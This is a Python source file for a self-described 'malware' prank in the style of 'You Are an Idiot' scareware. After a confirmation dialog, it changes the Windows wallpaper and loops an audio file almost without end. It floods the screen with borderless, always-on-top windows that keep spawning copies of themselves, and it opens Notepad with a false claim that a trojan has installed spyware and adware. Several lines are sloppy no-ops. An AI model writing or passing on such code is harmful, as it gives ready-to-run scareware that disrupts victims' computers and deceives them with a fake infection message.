import tkinter as tk
from tkinter import messagebox
import random
import pygame
import os
from screeninfo import get_monitors
import ctypes

warning_accepted = False


# Display the warning only if it has not been accepted
if not warning_accepted:
    response = messagebox.askyesno(" STOP Warning", "This program is malware. Do you want to proceed?")
    if response:
        warning_accepted = True
    else:
        exit()


def change_wallpaper(image_name):
    # Use the current working directory as the default folder
    wallpaper_folder = os.getcwd()

    # Construct the full path to the image
    image_path = os.path.join(wallpaper_folder, image_name)


    # Convert the image path to a C-style string
    image_path_c = image_path.encode("utf-16le")

    # Call the SystemParametersInfo function to set the desktop wallpaper
    result = ctypes.windll.user32.SystemParametersInfoW(
        0x0014, 0, image_path_c, 3
    )


# Example usage
change_wallpaper("Idiot_flashing.gif")


class MovingWindow:


    def __init__(self, master):
        global warning_accepted
         #Display the warning only if it has not been accepted
        # if not warning_accepted:
        #     self.show_warning()


        self.master = master
        self.master.title("YOUR FUCK UP lol")
        self.master.geometry("100x100")


        monitors = get_monitors()




        # Start the movement and duplication for each monitor
        # for monitor in monitors:
        #     self.create_duplicate_window(monitor)


        # Start the movement and duplication
        self.start_move()
        self.master.after(1, self.duplicate_window)




    def start_move(self):
        self.move_window_smooth()


    def move_window_smooth(self, steps=5, duration=0):
        initial_x = self.master.winfo_x()
        initial_y = self.master.winfo_y()


        # Adjust target coordinates based on the total screen area
        target_x = random.randint(0, self.master.winfo_screenwidth() - 150)
        target_y = random.randint(0, self.master.winfo_screenheight() -100)


        x_step = (target_x - initial_x) / steps
        y_step = (target_y - initial_y) / steps


        self.move_smooth_recursive(initial_x, initial_y, x_step, y_step, steps, duration)


    def move_smooth_recursive(self, current_x, current_y, x_step, y_step, steps_left, duration):
        if steps_left > 0:
            self.master.geometry(f"100x100+{int(current_x)}+{int(current_y)}")
           
            # Set a random background color
            random_color = "#{:06x}".format(random.randint(0, 0xFFFFFF))
            self.master.configure(bg=random_color)
           
            self.master.after(int(duration / 50),
                              lambda: self.move_smooth_recursive(current_x + x_step, current_y + y_step,
                                                                   x_step, y_step, steps_left - 1, duration))


    def duplicate_window(self):
        if not hasattr(self, "duplicated"):
            new_window = tk.Toplevel(self.master)
            new_window.overrideredirect(True)
            new_window.attributes("-topmost", True)
            new_window.geometry("100x100+0+0")
            MovingWindow(new_window)
            self.duplicated = True  # Mark that the window has been duplicated


    def reset_duplicated(self):
        self.duplicated = True
def main():
    pygame.init()
    pygame.mixer.init()


    # Load the music file
    # music_file = "you-are-an-idiot.mp3"  # Replace with the correct path to your music file
    music_file="you-are-an-idiot.mp3"
   
    if os.path.exists(music_file):
        pygame.mixer.music.load(music_file)
        pygame.mixer.music.play(1000000000)
        pygame.mixer.music.__spec__
        pygame.mixer.music.rewind

    else:
        print(f"Error: The music file '{music_file}' does not exist.")


    root = tk.Tk()
    root.geometry("20x200")
    root.title("Program Starter")


    program_starter = MovingWindow(root)


    root.mainloop()


if __name__ == "__main__":
    main()

main.loop:range(10)



import subprocess
import tempfile

def open_notepad_with_text(text):
    try:
        # Create a temporary file and write the text to it
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
            temp_file.write(text)

        # Open Notepad with the temporary file
        subprocess.run(['notepad.exe', temp_file.name], check=True)

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    open_notepad_with_text("hello your computer is fuckt by the vendow Trojan it now has spyware and adware have fun reseting your pc :) ")

